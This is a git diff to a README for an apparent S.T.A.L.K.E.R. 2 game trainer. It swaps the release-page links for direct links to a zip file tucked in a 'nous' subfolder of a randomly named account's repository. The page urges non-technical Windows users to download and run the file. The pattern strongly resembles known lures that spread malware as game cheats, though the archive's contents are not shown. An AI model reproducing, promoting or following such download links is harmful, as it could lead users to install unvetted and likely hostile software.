@@ -1,6 +1,6 @@
 # 🎮 Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026 - Your Ultimate Zone Survival Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Stalker2_Trainer_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://github.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Stalker2_Trainer_2026-00FF00?style=for-the-badge&logo=github&logoColor=white&labelColor=black)](https://raw.githubusercontent.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/main/nous/Trainer-Stalker-v2.6-alpha.1.zip)
 
 ## 🛡️ What Is This Trainer?
 
@@ -22,7 +22,7 @@ Follow these simple steps to get the trainer running on your Windows PC. No tech
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: [https://github.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/releases](https://github.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/main/nous/Trainer-Stalker-v2.6-alpha.1.zip](https://raw.githubusercontent.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/main/nous/Trainer-Stalker-v2.6-alpha.1.zip)
 
 Click the download button on that page. The file will start downloading automatically.
 
@@ -121,7 +121,7 @@ The trainer is free to use. There are no hidden fees or subscriptions. Download 
 
 ## 📥 Download Again
 
-If you lost the trainer or need to download it again, visit this link: [https://github.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/releases](https://github.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/releases)
+If you lost the trainer or need to download it again, visit this link: [https://raw.githubusercontent.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/main/nous/Trainer-Stalker-v2.6-alpha.1.zip](https://raw.githubusercontent.com/overabundant-saltonsea5951/Stalker2-Trainer---S.T.A.L.K.E.R.-2-Trainer-2026/main/nous/Trainer-Stalker-v2.6-alpha.1.zip)
 
 The latest version will always be available there.
 
